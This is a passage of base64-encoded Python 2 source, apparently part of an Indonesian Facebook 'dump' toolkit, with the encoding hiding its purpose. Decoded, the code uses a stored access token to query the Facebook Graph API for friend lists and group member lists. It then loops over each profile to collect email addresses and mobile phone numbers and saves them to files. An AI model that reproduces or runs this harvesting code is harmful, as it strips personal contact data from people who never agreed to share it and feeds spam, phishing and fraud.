xOzk3bSBHZXQgZ3JvdXAgbWVtYmVyIElEIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gR2V0IGdyb3VwIG1lbWJlciBlbWFpbCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi5cMDMzWzE7OTdtIEdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gR2V0IGVtYWlsIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOC5cMDMzWzE7OTdtIEdldCBlbWFpbCBmcmllbmQgZnJvbSBmcmllbmQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTkuXDAzM1sxOzk3bSBHZXQgYSBmcmllbmQncyBwaG9uZSBudW1iZXIiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEwLlwwMzNbMTs5N20gR2V0IGEgZnJpZW5kJ3MgcGhvbmUgbnVtYmVyIGZyb20gZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCglkdW1wX3BpbGloKCkKIy0tLS0tcGlsaWgKZGVmIGR1bXBfcGlsaWgoKToKCWN1aWggPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRW50ZXIgXDAzM1sxOzk3bSIpCglpZiBjdWloID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJZHVtcF9waWxpaCgpCgllbGlmIGN1aWggPT0iMSI6CgkJaWRfdGVtYW4oKQoJZWxpZiBjdWloID09IjIiOgoJCWlkZnJvbV90ZW1hbigpCgllbGlmIGN1aWggPT0iMyI6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgIlwwMzNbMTs5MW1TZWdlcmEiCgkJa2VsdWFyKCkKCWVsaWYgY3VpaCA9PSI0IjoKCQlpZF9tZW1iZXJfZ3J1cCgpCgllbGlmIGN1aWggPT0iNSI6CgkJZW1fbWVtYmVyX2dydXAoKQoJZWxpZiBjdWloID09IjYiOgoJCW5vX21lbWJlcl9ncnVwKCkKCWVsaWYgY3VpaCA9PSI3IjoKCQllbWFpbCgpCgllbGlmIGN1aWggPT0iOCI6CgkJZW1haWxmcm9tX3RlbWFuKCkKCWVsaWYgY3VpaCA9PSI5IjoKCQlub21vcl9ocCgpCgllbGlmIGN1aWggPT0iMTAiOgoJCWhwZnJvbV90ZW1hbigpCgllbGlmIGN1aWggPT0iMCI6CgkJbWVudSgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWR1bXBfcGlsaWgoKQoJCQojIyMjIyBJRCBURU1BTiAjIyMjIwpkZWYgaWRfdGVtYW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJcj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJej1qc29uLmxvYWRzKHIudGV4dCkKCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBpZCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlieiA9IG9wZW4oJ291dC9pZF90ZW1hbi50eHQnLCd3JykKCQlmb3IgYSBpbiB6WydkYXRhJ106CgkJCWlkdGVtYW4uYXBwZW5kKGFbJ2lkJ10pCgkJCWJ6LndyaXRlKGFbJ2lkJ10gKyAnXG4nKQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZHRlbWFuKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIithWydpZCddKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCWJ6LmNsb3NlKCkKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBpZCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIElEIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihpZHRlbWFuKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvaWRfdGVtYW4udHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCiMjIyMjIElEIEZST00gVEVNQU4gIyMjIyMKZGVmIGlkZnJvbV90ZW1hbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCQl0cnk6CgkJCWpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCWR1bXAoKQoJCXI9cmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2ZpZWxkcz1mcmllbmRzLmxpbWl0KDUwMDApJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXo9anNvbi5sb2FkcyhyLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYnogPSBvcGVuKCdvdXQvaWRfdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKCQlmb3IgYSBpbiB6WydmcmllbmRzJ11bJ2RhdGEnXToKCQkJaWRmcm9tdGVtYW4uYXBwZW5kKGFbJ2lkJ10pCgkJCWJ6LndyaXRlKGFbJ2lkJ10gKyAnXG4nKQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZGZyb210ZW1hbikpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrYVsnaWQnXSksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQliei5jbG9zZSgpCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgaWQgXDAzM1sxOzk3bS4uLi4nCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaWRmcm9tdGVtYW4pKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9pZF90ZW1hbl9mcm9tX3RlbWFuLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWtlbHVhcigpCgojIyMjIyBJRCBGUk9NIE1FTUJFUiBHUlVQICMjIyMjCmRlZiBpZF9tZW1iZXJfZ3J1cCgpOgoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJaWQ9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCQl0cnk6CgkJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQlhc3c9anNvbi5sb2FkcyhyLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBpZCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlieiA9IG9wZW4oJ291dC9tZW1iZXJfZ3J1cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCWlkbWVtLmFwcGVuZChhWydpZCddKQoJCQliei53cml0ZShhWydpZCddICsgJ1xuJykKCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaWRtZW0pKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK2FbJ2lkJ10pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpCgkJYnouY2xvc2UoKQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGlkbWVtKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvbWVtYmVyX2dydXAudHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCQkKIyMjIyMgRU1BSUwgRlJPTSBHUlVQICMjIyMjCmRlZiBlbV9tZW1iZXJfZ3J1cCgpOgoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJaWQ9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCQl0cnk6CgkJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQlhc3c9anNvbi5sb2FkcyhyLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBlbWFpbCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlieiA9IG9wZW4oJ291dC9lbV9tZW1iZXJfZ3J1cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWVtbWVtLmFwcGVuZCh6WydlbWFpbCddKQoJCQkJYnoud3JpdGUoelsnZW1haWwnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbW1lbSkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCWJ6LmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBmcm9tIG1lbWJlciBncm91cCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbW1lbSkpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L2VtX21lbWJlcl9ncnVwLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWtlbHVhcigpCgkJCiMjIyMjIE5PTUVSIEZST00gR1JVUCAjIyMjIwpkZWYgbm9fbWVtYmVyX2dydXAoKToKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCgkJdHJ5OgoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCWR1bXAoKQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWJ6ID0gb3Blbignb3V0L25vX21lbWJlcl9ncnVwLnR4dCcsJ3cnKQoJCXJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCXM9anNvbi5sb2FkcyhyZS50ZXh0KQoJCWZvciBhIGluIHNbJ2RhdGEnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIithWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJbm9tZW0uYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQoJCQkJYnoud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4obm9tZW0pKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJYnouY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IHBob25lIG51bWJlciBmcm9tIG1lbWJlciBncm91cCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4obm9tZW0pKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9ub19tZW1iZXJfZ3J1cC50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXBy